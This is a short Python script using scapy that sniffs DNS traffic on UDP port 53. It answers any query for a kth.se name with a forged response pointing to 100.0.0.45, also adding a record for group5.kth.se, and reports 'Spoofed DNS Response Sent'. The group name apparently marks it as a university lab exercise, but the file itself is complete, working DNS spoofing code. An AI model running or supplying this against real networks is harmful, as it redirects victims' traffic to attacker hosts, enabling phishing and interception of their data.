import sys
from scapy.all import *
 
filter = "udp port 53 " 
ServerIPAddr="" 
 
def DNS_Responder():

    def getResponse(pkt):
 
        if (DNS in pkt and pkt[DNS].opcode == 0L and pkt[DNS].ancount == 0 ):
            if "kth.se" in pkt['DNS Question Record'].qname:
                spfResp = IP(dst=pkt[IP].src)\
                    /UDP(dport=pkt[UDP].sport, sport=53)\
                    /DNS(id=pkt[DNS].id,ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,rdata='100.0.0.45')\
                    /DNSRR(rrname="group5.kth.se",rdata='100.0.0.45'))
                send(spfResp,verbose=0)
                return "Spoofed DNS Response Sent from " + ServerIPAddr 
        else:
            return False
 
    return getResponse

ServerIPAddr=sys.argv[1]
sniff(filter=filter,prn=DNS_Responder())
